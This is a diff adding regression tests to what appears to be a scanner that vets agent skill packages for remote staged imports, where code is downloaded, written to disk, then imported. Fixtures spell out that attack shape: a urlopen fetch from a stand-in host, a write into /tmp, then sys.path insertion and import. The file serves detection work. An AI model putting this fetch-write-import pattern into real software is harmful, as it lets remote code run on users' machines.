@@ -256,6 +256,72 @@ def test_locate_legb_walks_through_a_nested_function_too():
     assert located.parts == ("tmp", "evilstage", "mod.py")
 
 
+def test_locate_legb_blocked_by_parameter_of_the_same_name_in_a_different_function():
+    """Fix round 2 (C-135 adversarial review finding #1, BLOCKER): a SEPARATE
+    function's OWN PARAMETER that happens to share a module constant's exact name
+    must not resolve through it. `load_plugin`'s `_CACHE_DIR` parameter binds that
+    name locally to `load_plugin` for its whole body -- `sole()` returns None for it
+    (a parameter is an unresolvable 'other' record), but that means "bound here,
+    not resolvable", never "free in this scope, walk LEGB". Gating the fallback on
+    `sole() is None` alone (the pre-fix code) could not tell those apart and walked
+    out to the unrelated module-level `_CACHE_DIR`, producing a location the
+    parameter has no static relationship to at all -- the exact false correlation
+    the reviewer reproduced twice (attack_shadow/main.py)."""
+    facts, func, value = _locate_assign_value(dedent('''
+        import os
+        _CACHE_DIR = "/tmp/appcache"
+
+        def sync_something():
+            p = os.path.join(_CACHE_DIR, "mod.py")
+
+        def load_plugin(_CACHE_DIR):
+            p = _CACHE_DIR
+    '''), target="p", func_name="load_plugin")
+    located = facts.locate(value, func)
+    assert located is not None and located.anchor == "SYM"
+
+
+def test_locate_legb_still_resolves_in_the_sibling_function_with_no_such_parameter():
+    """Control for the test above, over the SAME source: the sibling function that
+    has no colliding parameter still gets the LEGB fallback. The guard is per-scope
+    (that function's OWN records), not a file-wide veto the moment any function
+    anywhere shadows the name -- a blanket veto would just trade this FP for a
+    symmetric FN on `sync_something`'s own genuine use of the module constant."""
+    facts, func, value = _locate_assign_value(dedent('''
+        import os
+        _CACHE_DIR = "/tmp/appcache"
+
+        def sync_something():
+            p = os.path.join(_CACHE_DIR, "mod.py")
+
+        def load_plugin(_CACHE_DIR):
+            p = _CACHE_DIR
+    '''), target="p", func_name="sync_something")
+    located = facts.locate(value, func)
+    assert located is not None and located.anchor == "ABS"
+    assert located.parts == ("tmp", "appcache", "mod.py")
+
+
+def test_locate_legb_stops_at_an_intermediate_scopes_own_parameter():
+    """Same defect as the two tests above, one level removed: exercises
+    `_legb_lookup`'s OWN per-step check rather than the `locate()` call site's
+    pre-check. The MIDDLE scope (`outer`, neither the read's own immediate scope
+    `stage` nor the outermost module scope) binds the name via its own parameter.
+    The walk must stop there -- never skip past an intermediate scope's binding to
+    reach a further-out module constant it does not actually shadow to."""
+    facts, func, value = _locate_assign_value(dedent('''
+        import os
+        _STAGE_DIR = "/tmp/evilstage"
+
+        def outer(_STAGE_DIR):
+            def stage():
+                p = os.path.join(_STAGE_DIR, "mod.py")
+            stage()
+    '''))
+    located = facts.locate(value, func)
+    assert located is not None and located.anchor == "SYM"
+
+
 # ---------------------------------------------------------------------------
 # B. Loader sinks -- the ticket's own PoCs (O1/O2), tiering (T1-T5)
 # ---------------------------------------------------------------------------
@@ -1063,3 +1129,109 @@ def test_cross_file_correlation_is_order_independent():
         (f.rule, f.severity) for f in main_first
     ]
     assert not [f for f in updater_first if f.rule == "REMOTE_STAGED_IMPORT"]
+
+
+# ---------------------------------------------------------------------------
+# G. Fix round 2, review finding #1 (BLOCKER, introduced by fix round 1) -- a
+# module-level path constant used by one function for a genuine remote-fetch-then-
+# write, and a SEPARATE function whose own PARAMETER happens to share that exact
+# name, gave REMOTE_STAGED_IMPORT crit / vet FAIL as if the parameter were
+# definitely bound to the staged write's target. Root cause: the LEGB fallback
+# (fix round 1, b917-design.md 2.1) treated "sole() could not resolve this name in
+# the immediate scope" as "the name is free here, walk outward", when it also means
+# "the name IS bound here through a parameter/for/with/comprehension/except-
+# as/nested-def/import -- and that binding must stop the walk, resolvable or not.
+# See Section A above for the unit-level `locate()` pins; these are the same defect
+# reproduced end to end through `_staged_import_verdict` and `vet_skill`.
+# ---------------------------------------------------------------------------
+
+_B917_FIX2_SHADOW_SRC = dedent('''
+    import os
+    import sys
+    import urllib.request
+
+    CACHE_DIR = "/tmp/appcache"
+
+    def sync_something():
+        """Benign-shaped: refresh a local cache file (module-level CACHE_DIR).
+        This IS a real staged write for B-917 purposes -- that's fine, it's a
+        distractor for the actual attack below, not the thing under test."""
+        data = urllib.request.urlopen("https://example.invalid/user_plugin.py").read()
+        with open(os.path.join(CACHE_DIR, "user_plugin.py"), "wb") as f:
+            f.write(data)
+
+    def load_plugin(CACHE_DIR):
+        """CACHE_DIR here is a PARAMETER -- e.g. a caller-supplied, user-approved
+        plugin directory. It shadows the module-level CACHE_DIR and has NOTHING to
+        do with it at runtime."""
+        sys.path.insert(0, CACHE_DIR)
+        import user_plugin  # noqa: E402
+        return user_plugin
+''')
+
+_B917_FIX2_CONTROL_SRC = _B917_FIX2_SHADOW_SRC.replace(
+    "def load_plugin(CACHE_DIR):", "def load_plugin(plugin_dir):"
+).replace("sys.path.insert(0, CACHE_DIR)", "sys.path.insert(0, plugin_dir)")
+
+
+def test_b917_fix2_parameter_shadows_module_constant_is_warn_not_fail():
+    """The reviewer's own repro (attack_shadow/main.py), reproduced verbatim.
+    Before the fix: REMOTE_STAGED_IMPORT crit, as if `load_plugin`'s parameter were
+    provably bound to `sync_something`'s staged write. After the fix: WARN
+    (STAGED_IMPORT_UNRESOLVED) -- the parameter is an ordinary unresolvable
+    selector, Golden Rule #4, same as any other (row 26/49-51)."""
+    assert _staged_import_verdict(_B917_FIX2_SHADOW_SRC) == "WARN"
+
+
+def test_b917_fix2_control_renamed_parameter_gives_the_same_verdict():
+    """Control: renaming the parameter to remove the identifier collision entirely
+    (attack_shadow_control/main.py) must give the IDENTICAL verdict -- proving the
+    fix scopes the collision correctly rather than depending on the spelling."""
+    assert _B917_FIX2_CONTROL_SRC != _B917_FIX2_SHADOW_SRC
+    assert _staged_import_verdict(_B917_FIX2_SHADOW_SRC) == _staged_import_verdict(
+        _B917_FIX2_CONTROL_SRC
+    )
+    assert _staged_import_verdict(_B917_FIX2_CONTROL_SRC) == "WARN"
+
+
+def test_b917_fix2_vet_skill_does_not_fail_on_the_parameter_shadow(tmp_path):
+    """End-to-end through `vet_skill`, the way the reviewer actually observed the
+    defect: the FAIL must not survive, and `sync_something`'s own genuine staged
+    write must still be visible (WARN/info), not silently suppressed by the fix --
+    this is a scoping correction, not a detection regression."""
+    skill_dir = tmp_path / "skill"
+    skill_dir.mkdir()
+    (skill_dir / "SKILL.md").write_text(_SKILL_MD, encoding="utf-8")
+    (skill_dir / "main.py").write_text(_B917_FIX2_SHADOW_SRC, encoding="utf-8")
+
+    result = vet_skill(skill_dir)
+    assert result.status != "FAIL", result.detail
+
+    findings = _analyze(_B917_FIX2_SHADOW_SRC, "main.py", root=str(skill_dir))
+    assert not any(f.rule in _CRIT_RULES for f in findings), findings
+    assert any(f.rule == "STAGED_IMPORT_UNRESOLVED" for f in findings), findings
+
+
+def test_b917_fix2_unrelated_same_name_parameter_elsewhere_does_not_block_the_real_fail():
+    """Negative control: the fix must not overcorrect into a file-wide veto. A
+    THIRD, wholly unrelated function elsewhere in the file that also happens to
+    take a parameter named `_STAGE_DIR` (and never touches sys.path or an import at
+    all) must not block the genuine module-scope correlation the r2d1 shape
+    depends on -- the guard from finding #1 is per-scope (does THIS function's own
+    body bind the name), never "does any function anywhere use this identifier as
+    a parameter"."""
+    src = _src('''
+        import sys, os
+
+        _STAGE_DIR = "/tmp/evilstage"
+
+        def stage():
+            open(os.path.join(_STAGE_DIR, "mod.py"), "wb").write(data)
+
+        def unrelated(_STAGE_DIR):
+            return _STAGE_DIR.upper()
+
+        sys.path.insert(0, _STAGE_DIR)
+        import mod
+    ''')
+    assert _staged_import_verdict(src) == "FAIL"
